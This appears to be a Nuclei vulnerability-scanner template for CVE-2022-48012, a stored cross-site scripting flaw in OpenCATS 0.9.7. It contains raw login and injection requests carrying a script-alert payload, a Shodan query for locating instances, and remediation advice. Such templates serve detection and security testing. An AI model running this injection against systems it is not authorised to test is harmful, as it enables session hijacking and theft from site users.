http:
- matchers:
  - condition: and
    dsl:
    - contains(body_1, "opencats - Login")
    - contains(body_3, "<script>alert(document.domain);</script>")
    type: dsl
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /index.php?m=login&a=attemptLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  - 'POST /index.php?m=settings&a=ajax_tags_upd HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    tag_title=<script>alert(document.domain);</script>

    '
id: CVE-2022-48012
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:opencats:opencats:0.9.7:*:*:*:*:*:*:*
    cve-id: CVE-2022-48012
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.32323
    epss-score: 0.00078
  description: 'OpenCATS 0.9.7 contains a cross-site scripting vulnerability via the
    component /opencats/index.php?m=settings&a=ajax_tags_upd. An attacker can inject
    arbitrary script in the browser of an unsuspecting user in the context of the
    affected site, which can allow the attacker to steal cookie-based authentication
    credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 3
    product: opencats
    shodan-query: title:"opencats"
    vendor: opencats
    verified: true
  name: OpenCATS 0.9.7 - Cross-Site Scripting
  reference:
  - https://github.com/Sakura-501/Opencats-0.9.7-Vulnerabilities
  - https://github.com/Sakura-501/Opencats-0.9.7-Vulnerabilities/blob/main/Opencats-0.9.7-Reflected%20XSS%20in%20onChangeTag.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-48012
  remediation: 'To mitigate this vulnerability, it is recommended to apply the latest
    security patches or upgrade to a newer version of OpenCATS that addresses the
    XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,opencats,authenticated
